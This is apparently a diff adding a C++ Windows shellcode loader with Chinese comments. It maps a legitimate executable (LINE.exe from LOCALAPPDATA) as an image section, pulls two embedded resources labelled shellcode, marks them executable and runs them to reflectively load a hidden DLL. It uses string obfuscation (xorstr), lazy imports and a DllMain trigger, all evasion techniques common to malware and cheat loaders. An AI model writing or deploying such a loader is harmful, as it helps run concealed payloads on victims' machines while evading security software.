@@ -1,0 +1,271 @@
+﻿
+#define _CRT_SECURE_NO_WARNINGS
+#include <windows.h>
+#include <winternl.h>
+#include <iostream>
+#include <xorstr.hpp>
+#include <lazy_importer.hpp>
+#pragma comment(lib, "ntdll.lib")
+#include <fstream>
+#include <filesystem>
+#include "memorymodulepp.h"
+
+// 声明 NtCreateSection
+extern "C" NTSTATUS NTAPI NtCreateSection(
+    PHANDLE            SectionHandle,
+    ACCESS_MASK        DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PLARGE_INTEGER     MaximumSize,
+    ULONG              SectionPageProtection,
+    ULONG              AllocationAttributes,
+    HANDLE             FileHandle
+);
+
+// 声明 NtMapViewOfSection
+extern "C" NTSTATUS NTAPI NtMapViewOfSection(
+    HANDLE          SectionHandle,
+    HANDLE          ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG_PTR       ZeroBits,
+    SIZE_T          CommitSize,
+    PLARGE_INTEGER  SectionOffset,
+    PSIZE_T         ViewSize,
+    DWORD           InheritDisposition,
+    ULONG           AllocationType,
+    ULONG           Win32Protect
+);
+
+
+extern "C" NTSTATUS NTAPI NtUnmapViewOfSection(
+    HANDLE ProcessHandle,
+    PVOID  BaseAddress
+);
+
+PVOID GetRelocVA(PVOID imageBase)
+{
+    auto dos = (IMAGE_DOS_HEADER*)imageBase;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
+        return nullptr;
+
+    auto nt = (IMAGE_NT_HEADERS*)((BYTE*)imageBase + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE)
+        return nullptr;
+
+    auto section = IMAGE_FIRST_SECTION(nt);
+    WORD number = nt->FileHeader.NumberOfSections;
+
+    for (int i = 0; i < number; ++i)
+    {
+        // 判断节名是否为 ".reloc"
+        if (memcmp(section[i].Name, ".themida", 6) == 0)
+        {
+            // 映射后的 VA = imageBase + VirtualAddress
+            return (BYTE*)imageBase + section[i].VirtualAddress;
+        }
+    }
+    return nullptr;
+}
+#include <string>
+#include <vector>
+extern void call_dll_main(uintptr_t image_base, void* dll_main_address);
+HANDLE hSection = nullptr;
+PVOID baseAddress = nullptr;
+int main()
+{
+
+    AllocConsole();
+
+    std::string localappdata = std::getenv("LOCALAPPDATA");
+    std::string localappdata_exe = localappdata + "\\LINE.exe";
+    if (!std::filesystem::exists(localappdata_exe))return -1;
+
+    // 1. 打开一个真实存在的 EXE/DLL 文件
+    HANDLE hFile = CreateFileA(
+        localappdata_exe.c_str(),  // 你可以换成任何合法文件
+        GENERIC_READ,
+        FILE_SHARE_READ,
+        nullptr,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        nullptr
+    );
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        std::cout << "Open file failed: " << GetLastError() << std::endl;
+        return 1;
+    }
+
+    // 2. 创建 Section (SEC_IMAGE)
+
+    NTSTATUS status = NtCreateSection(
+        &hSection,
+        SECTION_ALL_ACCESS,
+        nullptr,          // default object attributes
+        nullptr,          // size = file size
+        PAGE_READONLY, // protection
+        SEC_IMAGE,         // ⭐ 关键点：创建映像节
+        hFile
+    );
+
+    if (status != 0) {
+        std::cout << "NtCreateSection failed: 0x"
+            << std::hex << status << std::endl;
+        CloseHandle(hFile);
+        return 1;
+    }
+
+    std::cout << "NtCreateSection success!" << std::endl;
+
+    // 3. 将 section 映射到本进程
+
+    SIZE_T viewSize = 0;
+    status = NtMapViewOfSection(
+        hSection,
+        GetCurrentProcess(),
+        &baseAddress,
+        0,
+        0,
+        nullptr,
+        &viewSize,
+        1,                // ViewShare
+        0,
+        PAGE_EXECUTE_READ
+    );
+
+    if (status != 0) {
+        std::cout << xorstr_("NtMapViewOfSection failed: 0x")
+            << std::hex << status << std::endl;
+        CloseHandle(hSection);
+        CloseHandle(hFile);
+        return 1;
+    }
+
+    LoadLibraryA("user32.dll");
+
+
+    //   std::cout << "Mapped at: " << baseAddress
+    //       << "   size: " << std::dec << viewSize << " bytes" << std::endl;
+
+    std::vector<char> module_stp_bytes;
+    std::vector<char> dll_bytes;
+    {
+
+        /*rawData_vec.resize(sizeof(rawData));
+
+        memcpy(rawData_vec.data(), rawData, sizeof(rawData));*/
+
+#if _WINDLL
+        if (!lpmemorymodule)return -1;
+        auto shellcodeResource = MemoryFindResource(lpmemorymodule, MAKEINTRESOURCE(101), RT_RCDATA);
+        DWORD shellcodeSize = MemorySizeofResource(lpmemorymodule, shellcodeResource);
+        HGLOBAL shellcodeResouceData = MemoryLoadResource(lpmemorymodule, shellcodeResource);
+        rawData_vec.resize(shellcodeSize, 0);
+        memcpy(rawData_vec.data(), shellcodeResouceData, shellcodeSize);
+#else
+        {
+            auto shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(101), RT_RCDATA);
+            DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
+            HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);
+            module_stp_bytes.resize(shellcodeSize, 0);
+            memcpy(module_stp_bytes.data(), shellcodeResouceData, shellcodeSize);
+        }
+     
+
+
+        {
+            auto shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(102), RT_RCDATA);
+            DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
+            HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);
+            dll_bytes.resize(shellcodeSize, 0);
+            memcpy(dll_bytes.data(), shellcodeResouceData, shellcodeSize);
+        }
+#endif
+    }
+
+
+    /*std::ifstream inputFile(R"(C:\src\shellcode-factory\x64\Release\shellcode-payload.bin)", std::ios::binary);
+    if (!inputFile) {
+        std::cerr << "无法打开文件进行读取。" << std::endl;
+        return 1;
+    }
+    size_t fileSize = 0;
+    fileSize = inputFile.seekg(0, std::ios::end).tellg();
+
+
+    inputFile.seekg(0, std::ios::beg);*/
+
+
+    size_t fileSize = module_stp_bytes.size() + dll_bytes.size();
+
+    LPVOID mpic = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (mpic == NULL)
+    {
+        std::cerr << "无法分配内存。" << std::endl;
+        return 1;
+    }
+    auto va_ = GetRelocVA(baseAddress);
+    memcpy(mpic, module_stp_bytes.data(), module_stp_bytes.size());
+    memcpy((char*)mpic + module_stp_bytes.size(), dll_bytes.data(), dll_bytes.size());
+    using fuck = __int64(WINAPI*)(LPVOID);
+
+    DWORD da;
+    VirtualProtect(mpic, fileSize, PAGE_EXECUTE_READWRITE, &da);
+
+    auto u64_memory_module = (PMEMORYMODULE)reinterpret_cast<fuck>(mpic)(va_);
+    using dll_main_fn = BOOL (__stdcall*)(void*, unsigned int, void*);
+    reinterpret_cast<dll_main_fn>(u64_memory_module->exeEntry)(u64_memory_module->codeBase, 1, 0);
+
+    
+    //call_dll_main((uintptr_t)u64_memory_module->codeBase, (void*)u64_memory_module->exeEntry);
+
+
+
+    // VirtualFree(mpic, 0, MEM_RELEASE);
+
+    getchar();
+
+
+    // 5. 清理 
+    // （NtUnmapViewOfSection 默认在进程退出时自动清理）
+    ///CloseHandle(hSection);
+    CloseHandle(hFile);
+
+    return 0;
+
+}
+
+
+void InitConsole()
+{
+    // 申请一个新控制台窗口
+    AllocConsole();
+
+    // 重新打开 C 标准流，绑定到控制台
+    FILE* fp;
+    freopen_s(&fp, xorstr_("CONOUT$"), "w", stdout);  // printf / std::cout
+    freopen_s(&fp, xorstr_("CONOUT$"), "w", stderr);  // fprintf(stderr, ...) / std::cerr
+    freopen_s(&fp, xorstr_("CONIN$"), "r", stdin);    // scanf / std::cin
+
+    // 可选：同步 C++ iostream 与 C 的 stdio
+    std::ios::sync_with_stdio();
+}
+
+
+BOOL __stdcall DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpResever)
+{
+
+    if (dwReason == DLL_PROCESS_ATTACH)
+    {
+        InitConsole();
+        main();
+
+    }
+
+    if (dwReason == DLL_PROCESS_DETACH)
+    {
+        NtUnmapViewOfSection(GetCurrentProcess(), baseAddress);
+        CloseHandle(hSection);
+    }
+
+    return TRUE;
+}
